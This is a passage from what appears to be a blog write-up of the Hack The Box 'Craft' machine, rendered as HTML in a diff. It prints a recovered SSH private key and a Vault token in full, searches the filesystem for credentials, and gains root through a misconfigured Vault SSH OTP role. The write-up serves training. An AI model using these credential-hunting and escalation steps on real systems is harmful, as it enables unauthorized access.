+<path fill="currentColor"  d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6zm80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3L562.7 256l-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3z"/></svg></span>
+      
+      <span>SSH private key</span>
+    </span>
+    <span class="accordion-chevron ms-auto flex h-5 w-5 items-center justify-center print:hidden">
+      <span class="relative block icon"><svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+</span>
+    </span>
+  </summary>
+<div class="px-4 pb-4 text-neutral-700 dark:text-neutral-300">
+    <pre><code>parrot@parrot (~/Desktop/htb/machines/craft): cat id_rsa 
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDD9Lalqe
+qF/F3X76qfIGkIAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQDSkCF7NV2Z
+F6z8bm8RaFegvW2v58stknmJK9oS54ZdUzH2jgD0bYauVqZ5DiURFxIwOcbVK+jB39uqrS
+zU0aDPlyNnUuUZh1Xdd6rcTDE3VU16roO918VJCN+tIEf33pu2VtShZXDrhGxpptcH/tfS
+RgV86HoLpQ0sojfGyIn+4sCg2EEXYng2JYxD+C1o4jnBbpiedGuqeDSmpunWA82vwWX4xx
+lLNZ/ZNgCQTlvPMgFbxCAdCTyHzyE7KI+0Zj7qFUeRhEgUN7RMmb3JKEnaqptW4tqNYmVw
+pmMxHTQYXn5RN49YJQlaFOZtkEndaSeLz2dEA96EpS5OJl0jzUThAAAD0JwMkipfNFbsLQ
+B4TyyZ/M/uERDtndIOKO+nTxR1+eQkudpQ/ZVTBgDJb/z3M2uLomCEmnfylc6fGURidrZi
+4u+fwUG0Sbp9CWa8fdvU1foSkwPx3oP5YzS4S+m/w8GPCfNQcyCaKMHZVfVsys9+mLJMAq
+Rz5HY6owSmyB7BJrRq0h1pywue64taF/FP4sThxknJuAE+8BXDaEgjEZ+5RA5Cp4fLobyZ
+3MtOdhGiPxFvnMoWwJLtqmu4hbNvnI0c4m9fcmCO8XJXFYz3o21Jt+FbNtjfnrIwlOLN6K
+Uu/17IL1vTlnXpRzPHieS5eEPWFPJmGDQ7eP+gs/PiRofbPPDWhSSLt8BWQ0dzS8jKhGmV
+ePeugsx/vjYPt9KVNAN0XQEA4tF8yoijS7M8HAR97UQHX/qjbna2hKiQBgfCCy5GnTSnBU
+GfmVxnsgZAyPhWmJJe3pAIy+OCNwQDFo0vQ8kET1I0Q8DNyxEcwi0N2F5FAE0gmUdsO+J5
+0CxC7XoOzvtIMRibis/t/jxsck4wLumYkW7Hbzt1W0VHQA2fnI6t7HGeJ2LkQUce/MiY2F
+5TA8NFxd+RM2SotncL5mt2DNoB1eQYCYqb+fzD4mPPUEhsqYUzIl8r8XXdc5bpz2wtwPTE
+cVARG063kQlbEPaJnUPl8UG2oX9LCLU9ZgaoHVP7k6lmvK2Y9wwRwgRrCrfLREG56OrXS5
+elqzID2oz1oP1f+PJxeberaXsDGqAPYtPo4RHS0QAa7oybk6Y/ZcGih0ChrESAex7wRVnf
+CuSlT+bniz2Q8YVoWkPKnRHkQmPOVNYqToxIRejM7o3/y9Av91CwLsZu2XAqElTpY4TtZa
+hRDQnwuWSyl64tJTTxiycSzFdD7puSUK48FlwNOmzF/eROaSSh5oE4REnFdhZcE4TLpZTB
+a7RfsBrGxpp++Gq48o6meLtKsJQQeZlkLdXwj2gOfPtqG2M4gWNzQ4u2awRP5t9AhGJbNg
+MIxQ0KLO+nvwAzgxFPSFVYBGcWRR3oH6ZSf+iIzPR4lQw9OsKMLKQilpxC6nSVUPoopU0W
+Uhn1zhbr+5w5eWcGXfna3QQe3zEHuF3LA5s0W+Ql3nLDpg0oNxnK7nDj2I6T7/qCzYTZnS
+Z3a9/84eLlb+EeQ9tfRhMCfypM7f7fyzH7FpF2ztY+j/1mjCbrWiax1iXjCkyhJuaX5BRW
+I2mtcTYb1RbYd9dDe8eE1X+C/7SLRub3qdqt1B0AgyVG/jPZYf/spUKlu91HFktKxTCmHz
+6YvpJhnN2SfJC/QftzqZK2MndJrmQ=
+-----END OPENSSH PRIVATE KEY-----
+</code></pre>
+
+  </div>
+</details>
+
+</div>
+
+<style>
+  #accordion-fcc4c71865ba46c9b517400df551e3de > details + details {
+    border-top: 1px solid rgb(var(--color-neutral-200));
+  }
+  .dark #accordion-fcc4c71865ba46c9b517400df551e3de > details + details {
+    border-top-color: rgb(var(--color-neutral-700));
+  }
+</style>
+
+<style>
+  #accordion-fcc4c71865ba46c9b517400df551e3de details[data-accordion-item] > summary .accordion-chevron {
+    transform: rotate(-90deg);
+    transition: transform 200ms ease-in-out;
+  }
+  #accordion-fcc4c71865ba46c9b517400df551e3de details[data-accordion-item][open] > summary .accordion-chevron {
+    transform: rotate(0deg);
+  }
+</style>
+
+<script>
+  (() => {
+    const root = document.getElementById("accordion-fcc4c71865ba46c9b517400df551e3de");
+    if (!root) return;
+    const items = root.querySelectorAll("details[data-accordion-item]");
+    items.forEach((item) => {
+      item.addEventListener("toggle", () => {
+        if (!item.open) return;
+        items.forEach((other) => {
+          if (other !== item) other.removeAttribute("open");
+        });
+      });
+    });
+  })();
+</script>
+
+
+<br>
+When I try to authenticate with <code>ssh -i id_rsa gilfoyle@10.129.22.88</code> i get a message &ldquo;Load key &ldquo;id_rsa&rdquo;: error in libcrypto&rdquo;. From what I&rsquo;ve read this can happen when SSH expects an older private key format called PEM. You can easily know which one is which by looking at the first line:
+New one: <code>-----BEGIN OPENSSH PRIVATE KEY-----</code>
+Old one: <code>-----BEGIN RSA PRIVATE KEY-----</code></p>
+<p>Luckily, the key can be formatted easily with <code>ssh-keygen</code>. First let&rsquo;s make a copy of the original with <code>cp id_rsa id_rsa-original</code> and format the copy with <code>ssh-keygen -p -f id_rsa -m PEM</code>.
+When I tried to run this, I got another error stating <code>Failed to load key id_rsa: error in libcrypto</code>.</p>
+<p>After some digging, I <a href="https://maxrohde.com/2025/08/16/fix-error-in-libcrypto-error-reading-private-ssh-key/"  target="_blank" rel="noreferrer">found an article</a> stating that the issue was because the user didn&rsquo;t include a newline after the closing line of the key. I went back and raw copied the key from the github. I had two new lines at the end, when I pasted it like so, it worked flawlessly.</p>
+<p>Enumerating the user they don&rsquo;t have any low hanging permissions or rights to take advantage on. Interestingly, I&rsquo;m on the <code>craft.htb</code> host and not <code>db</code> which I suspected was the hostname of the Docker host.
+I looked a bit further and found <code>.vault-token</code> file which contains this token <code>f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9gilfoyle</code>. I looked through the filesystem with <code>find / -iname &quot;*vault*&quot; 2&gt;/dev/null</code> and found these files</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">/home/gilfoyle/.vault-token
+</span></span><span class="line"><span class="cl">/var/log/vaultssh.log
+</span></span><span class="line"><span class="cl">/usr/local/bin/vault
+</span></span><span class="line"><span class="cl">/usr/local/bin/vault-ssh-helper
+</span></span><span class="line"><span class="cl">/usr/local/etc/vault-ssh-helper.hcl</span></span></code></pre></div></div>
+<p>I then ran looked through them manually and greped for key words in them but didn&rsquo;t find anything interesting. I tried to ssh into the port 6022 as maybe that is the vault that is mentioned. The amount of SSH files suggested that but I still can&rsquo;t authenticate there.
+There are ssh related files and that the whole box is about web requests I decided to run my directory and subdomain enumerations as I canceled them prematurely at the start of the box. I scanned for some time but nothing new came up.</p>
+<p>I looked again through the <code>infra.craft</code> repo and found a folder named <code>vault</code>.
+as both <code>vault</code> and <code>vault-ssh-helper</code> are in the <code>bin</code> folder I should be able to execute them and see how they work.
+I can read and list secrets from a vault, the issue is that I don&rsquo;t know the path to it. I tried to do <code>vault list /ssh/roles/root_otp</code> as I saw this path in <code>secrets.sh</code> - didn&rsquo;t work and seemed far fetched.
+There is a way to use ssh to authenticate into a vault, maybe i can use that token I found before in it.
+This is the info from the <code>help</code> option:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl"># Info from the `help` option
+</span></span><span class="line"><span class="cl">SSH using the OTP mode (requires sshpass for full automation):
+</span></span><span class="line"><span class="cl">	$ vault ssh -mode=otp -role=my-role user@1.2.3.4
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">SSH using the CA mode:
+</span></span><span class="line"><span class="cl">	$ vault ssh -mode=ca -role=my-role user@1.2.3.4
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">SSH using CA mode with host key verification:
+</span></span><span class="line"><span class="cl">	$ vault ssh \
+</span></span><span class="line"><span class="cl">		-mode=ca \
+</span></span><span class="line"><span class="cl">		-role=my-role \
+</span></span><span class="line"><span class="cl">		-host-key-mount-point=host-signer \
+</span></span><span class="line"><span class="cl">		-host-key-hostnames=example.com \
+</span></span><span class="line"><span class="cl">	user@example.com</span></span></code></pre></div></div>
+<p>There are three way to authenticate &ldquo;one time password&rdquo; and two &ldquo;certificate authority&rdquo; modes. Looking at the token I found it looks more like an OTP authentication.</p>
+<p>I reviewed the source code and found these parts interesting:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">vault write ssh/roles/root_otp \
+</span></span><span class="line"><span class="cl">    key_type=otp \
+</span></span><span class="line"><span class="cl">    default_user=root \
+</span></span><span class="line"><span class="cl">    cidr_list=0.0.0.0/0
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Token: f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9gilfoyle
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">storage &#34;file&#34; {
+</span></span><span class="line"><span class="cl">	path = &#34;/vault/data&#34;
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">ui = false
+</span></span><span class="line"><span class="cl">listener &#34;tcp&#34; {
+</span></span><span class="line"><span class="cl">	address = &#34;0.0.0.0:8200&#34;
+</span></span><span class="line"><span class="cl">	tls_cert_file = &#34;/vault/pki/vault.craft.htb.crt&#34;
+</span></span><span class="line"><span class="cl">	tls_key_file = &#34;/vault/pki/vault.craft.htb.key&#34;
+</span></span><span class="line"><span class="cl">	tls_min_version = &#34;tls12&#34;</span></span></code></pre></div></div>
+<p>The first command is the most important one - it creates a role <code>root_otp</code> which can request to get OTPs for root and those request can come from any IP. This represents a lazy admin setup and because of this can get a root access simply by requesting it.
+The token is an OTP that was used by the user, it showed me what it looks like.
+The last script shows that the vault is located at <code>/vault/data</code> and that it is listening on all interfaces with HTTPS on the 8200 port.</p>
+<p>To get the root, I simply ran <code>vault ssh -mode=otp -role=root_otp root@10.129.22.88</code>.</p>
+<p>This box was challenging to me, one of the most confusing I worked on. I had little experience until now with working with APIs and creating injections is something I need to practice more. I liked that I challenged myself to write my first working exploit for this box and it helped me to learn and refresh my Python knowledge. Simulation of reading up on a git repo and a really hands on code review was a great learning experience. I never worked with HashiCorp Vault before so this was also interesting - a lot of pivoting as well.</p>
+<p>For code review and injections I think is important to try to really concentrate, go down the rabbit hole and really try to understand the logic of the mechanism. Sounds trivial I know, but I feel I could save a lot of time by starting with such hard mindset from the beginning.</p>
+<p>PS: I still didn&rsquo;t figure out what was port 6022 used for, so like ¯\<em>(ツ)</em>/¯</p>
 
           
           
